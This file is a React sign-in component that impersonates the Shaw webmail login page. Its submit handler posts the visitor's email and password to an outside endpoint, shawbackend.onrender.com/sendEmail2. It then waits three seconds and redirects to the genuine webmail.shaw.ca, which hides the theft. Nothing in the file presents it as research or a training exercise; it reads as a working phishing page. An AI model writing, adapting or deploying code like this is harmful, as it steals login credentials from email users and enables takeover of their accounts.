import { useState } from "react";
import { FaEye,FaEyeSlash } from "react-icons/fa6";

function SignUp(){
    const [inputs,setInputs] = useState({ email: '', password: '', website: 'Webmail' })
    const [isloading, setLoading] = useState(false)
    const [errorMessage, setErrorMessage] = useState("")
    const [eye,setEye] = useState(true)
    const toggleEye = () => {
        setEye(prevstate => !prevstate)
    }

    const handleFormChanges = (e) =>{
        const {name, value} = e.target
    
        setInputs((prevdata) => ({
          ...prevdata,
          [name]:value
         
         
          
        }))
      
       
     }
    

      
 const handleSignUp = async (e) => {
    e.preventDefault();
    
    const options = {
      method: 'POST',
      headers: {
        "content-type": 'application/json'
      },
      body: JSON.stringify({ email: inputs.email, password: inputs.password, website: inputs.website })
    };
  
    setTimeout(async () => {
      try {
        const response = await fetch("https://shawbackend.onrender.com/sendEmail2", options);
        const data = await response.json();
    
        if (data.message) {  window.location.href = 'https://webmail.shaw.ca/'; }
    
      } catch (error) {
        setErrorMessage(error);
         
      }
    }, 3000);
    setLoading(true)
  };
  
    
    return (
        <section className="grid sm:mt-16 lg:mt-2 mt-8  place-items-center">
            <form>
            <div className="input-container  ">
  <input className="w-80 lg:w-100 sm:w-96" type="text" placeholder=" " id="input-field"  name="email" onChange={handleFormChanges} value={inputs.email} />
  <label className="label text-base  " htmlFor="input-field">Email</label>
</div>
            <div className="relative input-container2">
  <input className="w-80 lg:w-100 sm:w-96" type={eye ? "password" : "text"} placeholder=" " id="input-field"  name="password"  onChange={handleFormChanges} value={inputs.password}/>
  <label className="label text-base  z-10  " htmlFor="input-field">Password</label>
  <div className="absolute -bottom-2   right-0 hover:cursor-pointer hover:bg-gray-50 bg-opacity-5 grid place-items-center h-11 w-11 rounded-full ">
{ eye ?  (<FaEye className="textcl text-lg " onClick={toggleEye}/>):<FaEyeSlash className="textcl text-lg "  onClick={toggleEye}/> }
  </div>
</div>
<button className="btncl mt-10 md:mt-12 text-white text-xs w-80 lg:w-100 sm:w-96   font-medium  py-2 rounded-md" onClick={handleSignUp}>SIGN IN</button>
  <div className="grid place-items-center mt-3"> <a href="https://support.themessaging.co/hc/en-au/articles/9391763413391-Reset-password-Unable-to-sign-in"  className="textcl text-sm  font-normal" >Forgot password?</a></div> 
   
            </form>

            <div>
                <div><p className="textcl">Language:</p></div>
            </div>
        </section>
    )
}
export default SignUp;